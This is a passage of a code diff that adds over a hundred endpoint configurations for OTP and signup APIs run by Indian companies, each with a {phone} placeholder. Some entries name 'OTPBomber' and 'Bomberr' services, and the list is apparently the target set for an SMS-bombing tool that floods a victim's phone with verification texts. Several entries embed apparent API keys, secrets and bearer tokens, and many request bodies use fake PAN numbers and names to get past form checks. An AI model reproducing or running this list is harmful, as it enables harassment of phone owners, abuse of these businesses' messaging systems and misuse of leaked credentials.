+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
+        ApiConfig("Khatabook", "https://api.khatabook.com/v1/auth/request-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_signature":"wk+avHrHZf2"}'),
+        ApiConfig("Nykaa", "https://www.nykaa.com/app-api/index.php/customer/send_otp", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "source=sms&mobile_number={phone}"),
+        ApiConfig("RummyCircle", "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isPlaycircle":false}'),
+        ApiConfig("Cosmofeed", "https://prod.api.cosmofeed.com/api/user/authenticate", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","version":"1.4.28"}'),
+        ApiConfig("Revv", "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","deviceType":"website"}'),
+        ApiConfig("PayMe_India", "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","app_signature":"S10ePIIrbH3"}'),
+        ApiConfig("Bomberr", "https://bomberr.onrender.com/num={phone}", "GET", {}, None),
+        ApiConfig("PaisaOnSalary", "https://cms.paisaonsalary.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
+        ApiConfig("PaisaBoxx", "https://api.paisaboxx.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}&partner_id=6350faa323&source=hexa&campaign=delhi_5499", "POST",
+                  {"Content-Type": "application/json", "Content-Length": "0"}, "{}"),
+        ApiConfig("LoanZap", "https://webapi.loanzap.in/v2/apply-loan/register-user", "POST",
+                  {"Content-Type": "application/json"}, '{"name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1","utm_source":"","utm_campaign":""}'),
+        ApiConfig("CashKredit", "https://api.cashkredit.in/v2/apply-loan/register-user", "POST",
+                  {"Content-Type": "application/json"}, '{"pan":"ABCDE1234F","name":"Binod","mobile":"{phone}","email":"test@gmail.com","terms":"1","utm_source":"","utm_campaign":""}'),
+        ApiConfig("RupeeLending", "https://rupeelending.com/apply-now/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("BrightLoans", "https://brightloans.in/login-sbm", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}&current_page=login&is_existing_customer=2&device_id={random_md5}"),
+        ApiConfig("SalaryTopUp", "https://salarytopup.in/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
+                  {"Content-Type": "application/json", "Auth": "MjQ4ZmY5MGM0MmM2N2EyOTJlZWE0MTBiNGU2Y2Q2NzU="},
+                  '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
+        ApiConfig("TezCredit", "https://api.tezcredit.com/identity/UserAuth/loginWithMobile?country_code=91&mobile={phone}", "POST",
+                  {"Content-Type": "application/json"}, "{}"),
+        ApiConfig("Swiggy_SMS", "https://www.swiggy.com/mapi/auth/sms-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","_csrf":"wYqwp6Boyjtu-la46bXHvrfnJrrsKmi4MmM3RTGk"}'),
+        ApiConfig("TataCapital_HL", "https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}'),
+        ApiConfig("TataCapital_PL", "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/generateOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","deviceOS":"Web","applSource":"PL","deviceType":"Web","deviceSubType":""}'),
+        ApiConfig("TataCapital_LAP", "https://onlinelaploans.tatacapital.com/APILayer/dlp/otp/services/generateOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}'),
+        ApiConfig("Univest", "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "GET", {}, None),
+        ApiConfig("HeroFinCorp_Festive", "https://festive.api.herofincorp.com/v1/customer/otp/{phone}", "GET", {}, None),
+        ApiConfig("MuscleBlaze", "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9", "GET",
+                  {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2"}),
+        ApiConfig("INRFlash", "https://offers.inrflash.com/campinr/index.php", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "action=send_otp&phoneNo={phone}"),
+        ApiConfig("MuthootFinance", "https://www.muthootfinance.com/smsapi.php", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobile={phone}&pin=Xmd6TERfO1haXjo3"),
+        ApiConfig("CRMSL", "https://api.crmsl.com/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
+                  {"Content-Type": "application/json", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM="},
+                  '{"mobile":"{phone}","event_name":"login","utm_source":"Value_Leaf","utm_medium":"GoogleBsub_id1}","utm_campaign":"pmax_1","utm_term":"836_01","utm_content":""}'),
+        ApiConfig("Factori", "https://factori.com/login/check_user_exists", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobNumber={phone}&countryCode=91"),
+        ApiConfig("Zepto", "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
+        ApiConfig("OneMG", "https://www.1mg.com/auth_api/v6/create_token", "POST",
+                  {"Content-Type": "application/json"}, '{"number":"{phone}"}'),
+        ApiConfig("ShipRocket2", "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}"}'),
+        ApiConfig("GoKwik", "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country":"in"}'),
+        ApiConfig("EntriApp", "https://entri.app/api/v3/users/check-phone/", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"+91{phone}","recaptcha_response":"dummy_token"}'),
+        ApiConfig("Apna", "https://production.apna.co/api/userprofile/v1/otp/", "POST",
+                  {"Content-Type": "application/json"}, '{"hash_type":"original","phone_number":"91{phone}","request_id":"{timestamp}","retries":0}'),
+        ApiConfig("DigiCredit", "https://customer-backend.digicredit.in/customers/customer-login", "POST",
+                  {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1"},
+                  '{"phoneNo":"{phone}","journey_down":"true"}'),
+        ApiConfig("Moglix", "https://apinew.moglix.com/nodeApi/v1/login/sendOtpV2", "POST",
+                  {"Content-Type": "application/json", "x-platform": "PWA"},
+                  '{"email":"","phone":"{phone}","type":"p","source":"signup","buildVersion":"37.3.1","metaSource":"","device":"mobile"}'),
+        ApiConfig("Housing2", "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API", "POST",
+                  {"Content-Type": "application/json", "app-name": "mobile_web_buyer"},
+                  '{"query":"mutation($phone:String){sendOtp(phone:$phone){success message}}","variables":{"phone":"{phone}"}}'),
+        ApiConfig("MyMoneyBazaar", "https://mm-app-backend.mymoneybazaar.com/api/v2/authentication/phone_no_verify/", "POST",
+                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
+        ApiConfig("Shopsy", "https://www.shopsy.in/1.rome/api/1/action/view", "POST",
+                  {"Content-Type": "application/json"}, '{"actionRequestContext":{"loginId":"{phone}","loginType":"MOBILE","verificationType":"OTP","type":"LOGIN_IDENTITY_VERIFY"}}'),
+        ApiConfig("KamakshiMoney", "https://loan-api.kamakshimoney.com/customers/customer-login-byMobile", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("PrimeCash", "https://api.primecash.app/api/v1/user", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isTNCVerified":true,"hash":"O9BmoTki4+6"}'),
+        ApiConfig("Allen", "https://api.allen-live.in/api/v1/auth/sendOtp", "POST",
+                  {"Content-Type": "application/json", "x-device-id": "{uuid}", "x-client-type": "mweb"},
+                  '{"country_code":"91","phone_number":"{phone}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}'),
+        ApiConfig("RupeeCare", "https://rc-backend.root.deployment.rupeecare.money/api/auth/get_otp", "POST",
+                  {"Content-Type": "application/json", "client-id": "d8247367-fabd-48c1-8314-ea00b431c232"},
+                  '{"phoneNo":"{phone}","clientId":"d8247367-fabd-48c1-8314-ea00b431c232"}'),
+        ApiConfig("Rupyalelo", "https://apply.rupyalelo.com/api/login", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("RoopyaMoney", "https://api.roopya.money/api/v2/customer/lead", "POST",
+                  {"Content-Type": "application/json", "apiSecret": "3acd32a5276b6b968028c2e7d6471051d5df9771d9049e2fc317b8e93113bdcc",
+                   "apiKey": "0025f469f0e293c539a207f2aaaa85c75f1c30191c31c44cc010c3b076ee1216"},
+                  '{"phone":"{phone}","countryCode":"+91","ip":"152.58.58.64"}'),
+        ApiConfig("Dhanrishi", "https://ub1.dhanrishi.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("SalaryOnTime", "https://journey.sotcrm.com/api/v1/journey-auth/send-otp/", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","utmSource":"","utmMedium":"","utmCampaign":"","utmTerm":"","sourceId":1}'),
+        ApiConfig("SpeedoLoan", "https://loanapply.speedoloan.com/api/login", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("FastSalary", "https://apilm.fastsalary.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "app.fastsalary.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"546481","panCard":"GDODJ5434B","brandId":"676027d3-a43c-4716-9663-7272f5df1ac7","domain":"app.fastsalary.com"}'),
+        ApiConfig("CredNidhi", "https://apilm.crednidhi.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "app.crednidhi.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"50000","panCard":"HSOSN5464B","brandId":"5d8868eb-40e8-47f8-a497-cd2ce6216c4f","domain":"app.crednidhi.com"}'),
+        ApiConfig("ClickMyLoan", "https://appb.clickmyloan.com/api/v2/authentication/phone_no_verify/", "POST",
+                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
+        ApiConfig("SuryaLoan", "https://microservices.suryaloan.com/api/v1/customer-journey/login", "POST",
+                  {"Content-Type": "application/json"}, 
+                  '{"utmSource":"Value_Leaf","utmMedium":"GoogleBsub_id1}","utmCampaign":"pmax_personal","utmTerm":"836_01","utm_content":"","mobile":"{phone}","sourceId":1}'),
+        ApiConfig("CreditSea", "https://backend.creditsea.com/api/v1/otp/generate-otp", "POST",
+                  {"Content-Type": "application/json", "platform": "CREDITSEA"},
+                  '{"phoneNumber":"{phone}","isWebUser":true}'),
+        ApiConfig("SalarySetu", "https://backend.salarysetu.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("ShreeLoan", "https://loanapply.shreeloan.com/api/login", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("PocketCredit", "https://pocketcredit.in/api/auth/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("ClickForMoney", "https://clickformoney.in/api/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
+        ApiConfig("JhatpatCash", "https://apilm.jhatpatcash.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "app.jhatpatcash.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"537078","panCard":"GSISB5468H","brandId":"d7c6bc00-9517-4d20-86f7-78b07f18a46d","domain":"app.jhatpatcash.com"}'),
+        ApiConfig("QuaLoan", "https://apilm.qualoan.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "app.qualoan.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"65000","panCard":"VUJVU5675H","brandId":"4b2f828d-e7d4-45d2-be7d-f2a0ee6a70ae","domain":"app.qualoan.com"}'),
+        ApiConfig("NexiLoans", "https://api-backend.nexiloans.com/user/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("ToofanLoan", "https://apilm.toofanloan.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "app.toofanloan.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"52800","panCard":"TSISV5434B","brandId":"4dd2f611-32b6-42a4-a14b-d493dc885000","domain":"app.toofanloan.com"}'),
+        ApiConfig("Rupee4u", "https://loanapply.rupee4u.com/api/login", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("PaisaPop", "https://apilm.paisapop.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "web.paisapop.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"538355","panCard":"FUOUR2389B","brandId":"165a2d32-d1bd-4287-b2db-104a7feee308","domain":"web.paisapop.com"}'),
+        ApiConfig("Figii", "https://consumer.figii.in/api/auth/login/", "POST",
+                  {"Content-Type": "application/json"}, '{"username":"{phone}","medium":"SMS","meta":{}}'),
+        ApiConfig("MinutesLoan", "https://apilm.minutesloan.com/api/v2/auth/send-signup", "POST",
+                  {"Content-Type": "application/json", "domain": "app.minutesloan.com"},
+                  '{"phoneNumber":"+91{phone}","email":"test@gmail.com","occupationTypeId":"7","monthlySalary":"55000","panCard":"ABCDE5438F","brandId":"0dbae4da-461a-4959-aa82-6a788de61593","domain":"app.minutesloan.com"}'),
+        ApiConfig("AyushmanLoan", "https://backend.ayushmanloan.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("Creditt", "https://prod-v4-app-api.credittapi.com/app/auth/mobile/otp/sent", "POST",
+                  {"Content-Type": "application/json", "appStore": "web_app", "api_version": "1.0",
+                   "deviceId": "device_{random_id}", "trackingId": "tracking_{random_id}",
+                   "appVersion": "1.0.21", "platform": "3"},
+                  '{"mobile":"{phone}"}'),
+        ApiConfig("FundsBull", "https://backend.fundsbull.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone_number":"{phone}"}'),
+        ApiConfig("F1SpeedLoan", "https://backend.f1speedloan.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("FundoBaba", "https://backend.fundobaba.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("RupeeRedee", "https://webservice-in-prod.rupeeredee.com/gate/api/v1/OTP", "POST",
+                  {"Content-Type": "application/json", "platform": "Web"},
+                  '{"number":"+91{phone}","type":"Mobile"}'),
+        ApiConfig("UdhaarPortal", "https://crm.udhaarportal.com/api/Api/Website/InstantJourneyController/appCustomerRegisteration", "POST",
+                  {"Content-Type": "application/json", "Auth": "ZTI4MTU1MzE4NWQ2MGQyZTFhNWM0NGU3M2UzMmM3MDM="},
+                  '{"mobile":"{phone}","event_name":"login","utm_source":"","utm_medium":"","utm_campaign":"","utm_term":"","utm_content":""}'),
+        ApiConfig("DuniyaFinance", "https://backend.duniyafinance.in/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("BlinkrLoan", "https://backend.blinkrloan.com/api/user/v3/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}","lat":"26.123456","lng":"77.123456","url":"https://www.blinkrloan.com/apply/pan-mobile"}'),
+        ApiConfig("NaukriLoans", "https://backend.naukriloans.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("UdharCapital", "https://www.udharcapital.com/api/send_otp.php", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "phone={phone}"),
+        ApiConfig("SalaryBolt", "https://backend.salarybolt.com/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("SabkaLoan", "https://api.sabkaloan.com/api/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("PaisaInTime", "https://micro-server-for-paisaintime-nrbe5.ondigitalocean.app/api/auth/get_otp", "POST",
+                  {"Content-Type": "application/json", "client-id": "08b61f94-4e99-4d4e-abe9-108a1078bbdb"},
+                  '{"phoneNo":"{phone}","clientId":"08b61f94-4e99-4d4e-abe9-108a1078bbdb"}'),
+        ApiConfig("FastPaise", "https://backend.fastpaise.in/api/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"PAN":"ABCDE1234F","phone_number":"{phone}"}'),
+        ApiConfig("Penpencil", "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0", "POST",
+                  {"Content-Type": "application/json", "client-type": "WEB", "client-id": "5eb393ee95fab7468a79d189"},
+                  '{"mobile":"{phone}","countryCode":"+91","subOrgId":"SUB-PWLI000"}'),
+        ApiConfig("OTPBomber", "https://otpbomber-40jd.onrender.com/api/bomb", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","ip":"192.168.1.1","iterations":2}'),
+        ApiConfig("RamFincorp", "https://loan-api.ramfincorp.com/customers/customer-login-byMobile", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("InCred", "https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate", "POST",
+                  {"Content-Type": "application/json"}, 
+                  '{"MOBILE":"{phone}","UTM_DETAILS":{"partnerId":"9250608873861026P"},"ON_BOARDING_TYPE":"FROM_LOAN_ENQUIRY","STATUS":"Pending"}'),
+        ApiConfig("Sephora", "https://sephora.in/api/service/application/user/authentication/v1.0/login/otp", "POST",
+                  {"Content-Type": "application/json", "authorization": "Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA=="},
+                  '{"mobile":"{phone}","country_code":"91"}'),
+        ApiConfig("JioSaavn", "https://api1.jiosaavn.com/jio/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone_number":"+91{phone}"}'),
+        ApiConfig("Cashvia", "https://customer-backend.cashvia.in/customers/customer-login", "POST",
+                  {"Content-Type": "application/json", "client-id": "7de19504-f422-42dc-bd51-5ed5dfb170c1"},
+                  '{"phoneNo":"{phone}","journey_down":true}'),
+        ApiConfig("RojgarKaro_SendOTP", "https://rojgarkaro.in/api/auth/sendOTP", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile_no":"{phone}","isSessionActive":false}'),
+        ApiConfig("RojgarKaro_Signup", "https://rojgarkaro.in/api/auth/sendOTPOnSignup", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile_no":"{phone}","email_id":"test@gmail.com","isSessionActive":false}'),
+        ApiConfig("BajajFinserv", "https://apigateway.bajajfinserv.in/apigateway/otp/sso", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileNumber":"{phone}","source":"WEB"}'),
+        ApiConfig("TataCliq", "https://www.tatacliq.com/api/v1/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","state":"login"}'),
+        ApiConfig("Droom", "https://api.droom.in/v1/user/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"91"}'),
+        ApiConfig("Yatra", "https://secure.yatra.com/social/common/yatra/action/doMobileLogin", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "mobileNo={phone}"),
+        ApiConfig("Licious", "https://www.licious.com/auth/api/v1/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCode":"+91"}'),
+        ApiConfig("CureFoods", "https://web.curefoods.com/api/v2/auth/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","country_code":"+91"}'),
+        ApiConfig("Puma", "https://in.puma.com/on/demandware.store/Sites-IN-Site/en_IN/Login-OtpRegistration", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "dwfrm_phone={phone}&format=ajax"),
+        ApiConfig("Decathlon", "https://www.decathlon.in/api/v1/auth/sendOTP", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","isLogin":true}'),
+        ApiConfig("McDonalds", "https://mcdelivery.mcdonaldsindia.com/api/v1/customer/otp", "POST",
+                  {"Content-Type": "application/json"}, '{"phoneNumber":"{phone}","source":"web"}'),
+        ApiConfig("Dominos", "https://pizzaonline.dominos.co.in/api/v1/auth/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"WEB"}'),
+        ApiConfig("Zivame", "https://www.zivame.com/auth/public/v1/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":"IN"}'),
+        ApiConfig("FirstCry", "https://www.firstcry.com/api/v2/auth/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
+        ApiConfig("Netmeds", "https://www.netmeds.com/api/v1/auth/login", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("Tata1mg", "https://www.1mg.com/auth_api/v6/create_token", "POST",
+                  {"Content-Type": "application/json"}, '{"number":"{phone}","login_with":"mobile"}'),
+        ApiConfig("Upstox", "https://api.upstox.com/v2/login/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","client_id":"UPSTOX"}'),
+        ApiConfig("Zerodha", "https://kite.zerodha.com/api/login", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded"}, "user_id={phone}"),
+        ApiConfig("Groww", "https://groww.in/api/v2/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","platform":"WEB"}'),
+        ApiConfig("PolicyBazaar", "https://www.policybazaar.com/api/v1/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
+        ApiConfig("Ditto", "https://www.dittotv.in/auth/sendOTP/v1", "POST",
+                  {"Content-Type": "application/json"}, '{"mobileno":"{phone}","sendOTP":true}'),
+        ApiConfig("SonyLiv", "https://www.sonyliv.com/api/v1/auth/sendOTP", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":"+91"}'),
+        ApiConfig("Hotstar", "https://api.hotstar.com/r9/v1/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","countryCode":"IN"}'),
+        ApiConfig("BookMyShow_SMS", "https://in.bookmyshow.com/auth/send/otp", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}"}'),
+        ApiConfig("RentoMojo_Signup", "https://www.rentomojo.com/api/RMUsers/signup", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","password":"Test@123","name":"Test User"}'),
+        ApiConfig("Furlenco", "https://www.furlenco.com/api/v1/auth/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","term":"true"}'),
+        ApiConfig("CityFurnish", "https://www.cityfurnish.com/api/v1/auth/sendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}"}'),
+        ApiConfig("Ixigo", "https://www.ixigo.com/api/v2/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCode":"+91"}'),
+        ApiConfig("EaseMyTrip", "https://www.easemytrip.com/api/otp/SendOtp", "POST",
+                  {"Content-Type": "application/json"}, '{"Mobileno":"{phone}","Type":"M"}'),
+        ApiConfig("Goibibo", "https://www.goibibo.com/api/v2/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","countryCode":"+91"}'),
+        ApiConfig("RedBus", "https://www.redbus.in/api/v2/auth/otp/send", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"web"}'),
+        ApiConfig("Rapido_SMS", "https://rapido.bike/api/v1/otp/generate", "POST",
+                  {"Content-Type": "application/json"}, '{"mobile":"{phone}","source":"SMS"}'),
+        ApiConfig("PocketMoney", "https://api2.the-pocket-money.com/pokktmoney/send_verification_code?os_type=16&device_id=&device_model=&carrier_name=null&country_code=91&verification_phone={phone}", "GET",
+                  {"X-Verification-Key": "NTk2OTJjNzI3NzAwZDdkYjQxYmM5N2Y1MzlmNTA2NmM=",
+                   "X-POCKET-KEY": "FwMqEpp8XHfrR8xBTGiteY62q3NW96ulwqkGeY7lDU7hfYZ7H4DJPITtTZwyfWj1"}),
+        ApiConfig("MagicPin_SMS", "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/", "POST",
+                  {"Content-Type": "application/json", "auth-secret-key": "kQLMCQBrfevxhzuPpFWT",
+                   "origin": "https://magicpin.in", "x-requested-with": "mark.via.gp",
+                   "referer": "https://magicpin.in/"}, 
+                  '{"phoneNumber":"91{phone}","authMethod":"sms","token":"{random_md5}"}'),
+        ApiConfig("Udaan_SMS", "https://auth.udaan.com/api/otp/send?client_id=udaan-v2&whatsappConsent=true", "POST",
+                  {"Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "x-app-id": "udaan-auth"},
+                  "mobile={phone}"),
+        ApiConfig("SmartCoin_SMS", "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request", "POST",
+                  {"Content-Type": "application/json", "user_platform": "WEBFLOW", "platform_code": "olyv"},
+                  '{"phone_number":"{phone}","app_version":"100101","channel":"SMS","request_type":"REGISTRATION","onboarding_consent":true}'),
+        ApiConfig("OLX_SMS", "https://www.olx.in/api/auth/authenticate", "POST",
+                  {"Content-Type": "application/json", "user-agent": "okhttp/3.9.1"},
+                  '{"method":"sms","phone":"{phone}","language":"en-IN","grantType":"retry"}'),
+        ApiConfig("OTPBomber_API", "https://otp-bomber-api.vercel.app/api?phone={phone}", "GET", {}, None),
+        ApiConfig("Codfirm_SMS", "https://api.codfirm.in/api/customers/login/otp/send", "POST",
+                  {"Content-Type": "application/json", "x-csrf-token": "{random_md5}"},
+                  '{"medium":"sms","storeUrl":"clinikally.myshopify.com","phone":"{phone}"}'),
+        ApiConfig("CreditSea2", "https://backend.creditsea.com/api/v1/otp/generate-otp", "POST",
+                  {"Content-Type": "application/json", "platform": "CREDITSEA"},
+                  '{"phoneNumber":"{phone}","fromLoginPage":true,"isWebUser":true}'),
+        ApiConfig("MuscleBlaze2", "https://www.muscleblaze.com/veronica/user/validate/9/{phone}/signup?plt=2&st=9", "GET",
+                  {"HKAUTH": "396144437|9l7fQT5m5HJtTrXqRZiWdQ==", "pageuri": "/", "st": "9", "plt": "2", "device": "{uuid}"}),
+        ApiConfig("Penpencil_SMS", "https://api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "POST",
+                  {"Content-Type": "application/json", "version": "0.0.1", "subOrgId": "SUB-PWST002",
+                   "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"},
+                  '{"mobile":"{phone}","firstName":"djdk","lastName":"","countryCode":"+91","subOrgId":""}'),
+        ApiConfig("Oziva_SMS", "https://api.prod.oziva.in/nitro/send/", "POST",
+                  {"Content-Type": "application/json"}, '{"phone":"{phone}","source":"order_management","type":"sms","consentForAddressUse":false}'),
+        ApiConfig("Astroyogi_Comm_SMS", "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3", "POST",
+                  {"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzg4NDU0MTc4LCJleHAiOjE3OTYyMzAxNzh9."},
+                  '{"PhoneNumber":"{phone}","PhoneCode":"91","Domain":"Web","CountryId":"IN","IpAddress":"117.225.1.174","CountryCodeByHeader":"IN"}'),
+        ApiConfig("Refyne_SMS", "https://prod-api.refyne.co.in/auth/v3/send-otp", "POST",
+                  {"Content-Type": "application/json"}, '{"channel":"SMS","recipient":"{phone}"}'),
